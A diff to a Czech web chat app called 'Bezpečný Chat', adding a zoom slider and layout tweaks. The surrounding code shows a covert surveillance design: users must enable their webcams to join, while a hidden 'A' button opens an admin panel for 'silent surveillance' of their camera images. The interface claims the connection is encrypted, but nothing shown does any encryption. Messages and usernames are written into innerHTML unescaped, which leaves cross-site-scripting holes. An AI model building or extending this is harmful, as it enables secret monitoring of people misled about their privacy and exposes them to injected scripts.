@@ -13,6 +13,7 @@
             -moz-user-select: none;
             -ms-user-select: none;
             user-select: none;
+            transition: font-size 0.15s ease-out; /* Hladký přechod při změně velikosti */
         }
         /* Černá clona blokující neoprávněné screenshoty */
         #anti-screenshot-overlay {
@@ -22,6 +23,20 @@
             background: black;
             z-index: 99999;
         }
+        /* Přizpůsobení posuvníku (slideru) pro zvětšení */
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            background: #3b82f6;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+        input[type="range"]::-webkit-slider-thumb:hover {
+            background: #60a5fa;
+        }
     </style>
 </head>
 <body class="bg-gray-900 text-white font-sans h-screen flex flex-col justify-between overflow-hidden">
@@ -30,19 +45,19 @@
     <div id="anti-screenshot-overlay"></div>
 
     <!-- Skryté Admin tlačítko "A" vpravo nahoře -->
-    <button id="admin-btn" class="absolute top-3 right-4 text-gray-700 hover:text-gray-500 text-sm font-semibold transition-colors focus:outline-none opacity-30 hover:opacity-100">
+    <button id="admin-btn" class="absolute top-3 right-4 text-gray-700 hover:text-gray-500 text-sm font-semibold transition-colors focus:outline-none opacity-30 hover:opacity-100 z-50">
         A
     </button>
 
     <!-- KROK 1: PŘIHLÁŠENÍ & WEBKAMERA -->
     <div id="login-screen" class="flex-1 flex flex-col items-center justify-center p-6">
-        <div class="bg-gray-800 p-8 rounded-lg shadow-2xl max-w-sm w-full text-center border border-gray-700">
-            <h1 class="text-2xl font-bold mb-4">Bezpečný Chat</h1>
+        <div class="bg-gray-800 p-8 rounded-lg shadow-2xl max-w-md w-full text-center border border-gray-700">
+            <h1 class="text-3xl font-bold mb-4">Bezpečný Chat</h1>
             <p class="text-gray-400 text-sm mb-6">Pro vstup do chatu zadej své jméno a povol přístup ke kameře.</p>
             
-            <input type="text" id="username-input" placeholder="Tvoje jméno..." class="w-full p-3 mb-4 rounded bg-gray-700 border border-gray-600 focus:outline-none focus:border-blue-500 text-white">
+            <input type="text" id="username-input" placeholder="Tvoje jméno..." class="w-full p-3 mb-4 rounded bg-gray-700 border border-gray-600 focus:outline-none focus:border-blue-500 text-white text-base">
             
-            <button id="start-btn" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 px-4 rounded transition-colors shadow-lg">
+            <button id="start-btn" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 px-4 rounded transition-colors shadow-lg text-base">
                 Vstoupit do místnosti
             </button>
             <p id="login-error" class="text-red-500 text-sm mt-3 hidden"></p>
@@ -53,18 +68,27 @@
     <video id="webcam" autoplay playsinline class="hidden"></video>
     <canvas id="canvas" class="hidden"></canvas>
 
-    <!-- KROK 2: ŠIFROVANÝ CHAT -->
-    <div id="chat-screen" class="hidden flex-1 flex flex-col h-full max-w-4xl mx-auto w-full p-4 overflow-hidden">
+    <!-- KROK 2: ŠIFROVANÝ CHAT (Wider layout pro větší komfort) -->
+    <div id="chat-screen" class="hidden flex-1 flex flex-col h-full max-w-7xl mx-auto w-full p-4 overflow-hidden">
         <!-- Záhlaví -->
-        <div class="flex justify-between items-center pb-3 border-b border-gray-800">
+        <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3 pb-3 border-b border-gray-800">
             <div>
-                <h2 class="text-lg font-bold">Zabezpečený kanál</h2>
-                <p class="text-xs text-green-400 flex items-center gap-1.5">
+                <h2 class="text-xl font-bold tracking-tight">Zabezpečený kanál</h2>
+                <p class="text-xs text-green-400 flex items-center gap-1.5 mt-0.5">
                     <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
                     Připojení je aktivní a šifrované
                 </p>
             </div>
-            <div id="admin-badge" class="hidden bg-red-600 text-xs px-2.5 py-1 rounded font-bold uppercase tracking-wider">ADMIN</div>
+            
+            <!-- Ovládací prvky v hlavičce (Velikost rozhraní a Admin status) -->
+            <div class="flex items-center justify-between sm:justify-end gap-3 w-full sm:w-auto">
+                <div class="flex items-center gap-2 bg-gray-800/90 px-3 py-1.5 rounded-lg border border-gray-700 text-xs">
+                    <span class="text-gray-400 font-medium">Zvětšení:</span>
+                    <input type="range" id="zoom-slider" min="14" max="24" value="16" class="w-20 h-1 bg-gray-700 rounded-lg appearance-none cursor-pointer accent-blue-500">
+                    <span id="zoom-value" class="font-mono text-gray-300 w-10 text-right">100%</span>
+                </div>
+                <div id="admin-badge" class="hidden bg-red-600 text-xs px-2.5 py-1.5 rounded font-bold uppercase tracking-wider shadow-md">ADMIN</div>
+            </div>
         </div>
 
         <!-- Okno se zprávami -->
@@ -74,16 +98,16 @@
 
         <!-- Vstup pro psaní zpráv -->
         <div class="flex gap-2 pb-2">
-            <input type="text" id="message-input" placeholder="Napiš zprávu..." class="flex-1 p-3 rounded bg-gray-800 border border-gray-700 focus:outline-none focus:border-blue-500 text-white">
-            <button id="send-btn" class="bg-blue-600 hover:bg-blue-500 px-6 py-3 rounded font-bold transition-colors">Odeslat</button>
+            <input type="text" id="message-input" placeholder="Napiš zprávu..." class="flex-1 p-3.5 rounded bg-gray-800 border border-gray-700 focus:outline-none focus:border-blue-500 text-white text-base shadow-inner">
+            <button id="send-btn" class="bg-blue-600 hover:bg-blue-500 px-8 py-3.5 rounded font-bold transition-colors shadow-lg text-base">Odeslat</button>
         </div>
     </div>
 
-    <!-- KROK 3: ADMIN PANEL (Vespod obrazovky pro flexibilitu na desktopech) -->
-    <div id="admin-panel" class="hidden bg-gray-950 p-6 border-t border-red-950 max-h-[350px] overflow-y-auto w-full">
+    <!-- KROK 3: ADMIN PANEL (Vespod obrazovky, automaticky se zvětšuje s celým webem) -->
+    <div id="admin-panel" class="hidden bg-gray-950 p-6 border-t border-red-950 max-h-[400px] overflow-y-auto w-full">
         <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 mb-4 border-b border-gray-800 pb-3">
             <div>
-                <h3 class="text-red-500 font-bold text-lg tracking-wide uppercase">Administrace Chatu</h3>
+                <h3 class="text-red-500 font-bold text-xl tracking-wide uppercase">Administrace Chatu</h3>
                 <p class="text-xs text-gray-500">Mód tichého dohledu aktivován</p>
             </div>
             <!-- Přepínače záložek -->
@@ -115,14 +139,14 @@
             </div>
         </div>
 
-        <!-- ZÁLOŽKA: WEB KAMERY (Grid s kamerami jako při volání) -->
+        <!-- ZÁLOŽKA: WEB KAMERY (Grid s kamerami jako při video callu) -->
         <div id="admin-cameras-view" class="hidden">
-            <div class="grid grid-cols-2 sm:grid-cols-4 gap-4">
+            <div class="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-5 gap-4">
                 <!-- Adminův lokální náhled (Admin vidí sám sebe) -->
                 <div class="bg-gray-900 p-2 rounded border border-red-900 flex flex-col items-center relative group">
-                    <div class="w-full h-28 bg-black rounded mb-2 overflow-hidden relative">
+                    <div class="w-full h-32 bg-black rounded mb-2 overflow-hidden relative">
                         <video id="admin-local-video" autoplay playsinline muted class="w-full h-full object-cover scale-x-[-1]"></video>
-                        <span class="absolute top-1 left-1 bg-red-600 text-[9px] font-bold uppercase tracking-wider px-1.5 py-0.5 rounded shadow">Ty (Admin)</span>
+                        <span class="absolute top-1.5 left-1.5 bg-red-600 text-[10px] font-bold uppercase tracking-wider px-1.5 py-0.5 rounded shadow">Ty (Admin)</span>
                     </div>
                     <span class="text-xs text-gray-400 font-semibold truncate w-full text-center">Moje kamera</span>
                 </div>
@@ -149,7 +173,7 @@
             deleteDoc
         } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-        // Firebase konfigurace zadaná uživatelem
+        // Firebase konfigurace
         const firebaseConfig = {
             apiKey: "AIzaSyBW4c4DEWgNTALWMpPCbBdyYIQMGRDP640",
             authDomain: "bezpecnychat.firebaseapp.com",
@@ -194,7 +218,22 @@
         const remoteCamerasGrid = document.getElementById('remote-cameras-grid');
         const usersTableBody = document.getElementById('users-table-body');
 
-        // --- TABS MANAGEMENT (Přepínání záložek) ---
+        // Zoom/Velikostní elementy
+        const zoomSlider = document.getElementById('zoom-slider');
+        const zoomValue = document.getElementById('zoom-value');
+
+        // --- DYNAMICKÝ ZOOM ROZHRANÍ (Zvětšení textu i všech elementů) ---
+        zoomSlider.addEventListener('input', (e) => {
+            const size = e.target.value;
+            // Nastavení font-size na kořenový element (html), čímž se proporcionálně zvětší všechny Tailwind rem hodnoty
+            document.documentElement.style.fontSize = `${size}px`;
+            
+            // Výpočet procentuálního zvětšení oproti výchozím 16px
+            const percentage = Math.round((size / 16) * 100);
+            zoomValue.innerText = `${percentage}%`;
+        });
+
+        // --- TABS MANAGEMENT (Přepínání záložek v administraci) ---
         tabUsersBtn.addEventListener('click', () => {
             tabUsersBtn.className = "bg-red-900 text-white px-4 py-1.5 rounded-md font-semibold text-xs transition shadow-md";
             tabCamerasBtn.className = "text-gray-400 hover:text-white px-4 py-1.5 rounded-md font-semibold text-xs transition";
@@ -322,13 +361,13 @@
                         msgDiv.className = "flex flex-col items-end";
                         msgDiv.innerHTML = `
                             <span class="text-xs text-gray-500 mr-1 font-semibold">${msg.sender}</span>
-                            <div class="bg-blue-600 text-white p-3 rounded-lg rounded-tr-none max-w-xs break-all shadow">${msg.text}</div>
+                            <div class="bg-blue-600 text-white p-3 rounded-lg rounded-tr-none max-w-md break-all shadow text-sm sm:text-base">${msg.text}</div>
                         `;
                     } else {
                         msgDiv.className = "flex flex-col items-start";
                         msgDiv.innerHTML = `
                             <span class="text-xs text-gray-500 ml-1 font-semibold">${msg.sender}</span>
-                            <div class="bg-gray-800 text-white p-3 rounded-lg rounded-tl-none max-w-xs break-all shadow">${msg.text}</div>
+                            <div class="bg-gray-800 text-white p-3 rounded-lg rounded-tl-none max-w-md break-all shadow text-sm sm:text-base">${msg.text}</div>
                         `;
                     }
                     messagesContainer.appendChild(msgDiv);
@@ -387,7 +426,7 @@
 
                     // --- GENERUJEME TABULKU UŽIVATELŮ ---
                     const tr = document.createElement('tr');
-                    tr.className = "hover:bg-gray-950 transition border-b border-gray-800";
+                    tr.className = "hover:bg-gray-950 transition border-b border-gray-800 text-sm sm:text-base";
                     tr.innerHTML = `
                         <td class="p-3 font-semibold text-gray-200">${u.username}</td>
                         <td class="p-3">
@@ -412,15 +451,15 @@
 
                     // Pokud má fotku, zobrazí ji, jinak zobrazí šedý stav čekání
                     const cameraContent = u.photo 
-                        ? `<img src="${u.photo}" class="w-full h-28 object-cover rounded mb-2 border border-gray-700">`
-                        : `<div class="w-full h-28 bg-gray-800 rounded mb-2 flex items-center justify-center text-[10px] text-gray-500">Čekání na obraz...</div>`;
+                        ? `<img src="${u.photo}" class="w-full h-32 object-cover rounded mb-2 border border-gray-700">`
+                        : `<div class="w-full h-32 bg-gray-800 rounded mb-2 flex items-center justify-center text-[11px] text-gray-500">Čekání na obraz...</div>`;
 
                     card.innerHTML = `
                         <div class="w-full relative">
                             ${cameraContent}
-                            <span class="absolute top-1 left-1 bg-green-600 text-white text-[9px] font-bold uppercase tracking-wider px-1.5 py-0.5 rounded shadow animate-pulse">Přenos</span>
+                            <span class="absolute top-1.5 left-1.5 bg-green-600 text-white text-[9px] font-bold uppercase tracking-wider px-1.5 py-0.5 rounded shadow animate-pulse">Přenos</span>
                         </div>
-                        <span class="text-xs text-gray-300 font-semibold truncate w-full text-center">${u.username}</span>
+                        <span class="text-xs text-gray-300 font-semibold truncate w-full text-center mt-1">${u.username}</span>
                     `;
                     remoteCamerasGrid.appendChild(card);
                 });
